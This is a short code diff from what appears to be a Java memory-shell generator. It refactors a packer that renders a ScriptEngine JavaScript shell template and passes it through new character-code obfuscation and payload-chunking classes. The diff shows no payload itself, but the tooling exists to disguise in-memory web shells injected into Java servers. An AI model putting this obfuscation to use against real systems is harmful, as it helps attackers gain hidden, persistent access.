@@ -6,7 +6,9 @@ import org.leo.jmg.mem.packer.PackerCapability;
 import org.leo.jmg.mem.packer.PackerMeta;
 import org.leo.jmg.mem.packer.PackerRegistry;
 import org.leo.jmg.mem.packer.TemplateRenderer;
-import org.leo.jmg.mem.packer.Util;
+import org.leo.jmg.mem.packer.PackerResources;
+import org.leo.jmg.mem.packer.obfuscation.LiteralObfuscator;
+import org.leo.jmg.mem.packer.obfuscation.PayloadObfuscator;
 
 import java.util.Collections;
 
@@ -20,7 +22,7 @@ import static org.leo.jmg.mem.packer.scriptengine.DefaultScriptEnginePacker.scri
         requiredClasses = "javax.script.ScriptEngineManager"
 )
 public class ScriptEngineBigIntegerPacker implements Packer {
-    private final String jsTemplate = Util.loadTemplateFromResource("/memshell-template/ScriptEngineBigInteger.js.txt");
+    private final String jsTemplate = PackerResources.loadTemplate("/memshell-template/ScriptEngineBigInteger.js.txt");
 
     @Override
     public String pack(ClassPackerConfig config) throws Exception {
@@ -29,6 +31,7 @@ public class ScriptEngineBigIntegerPacker implements Packer {
         // bigIntegerStr 作为额外占位符传入（不经过 chunkPayload，base36 字符集已覆盖）
         String script = TemplateRenderer.render(jsTemplate, config,
                 Collections.singletonMap("bigIntegerStr", bigIntegerStr));
-        return scriptToSingleLine(Util.chunkPayload(Util.ghostBitsEncodeJs(script)));
+        return scriptToSingleLine(PayloadObfuscator.chunk(
+                LiteralObfuscator.javascriptCharCodes(script)));
     }
 }
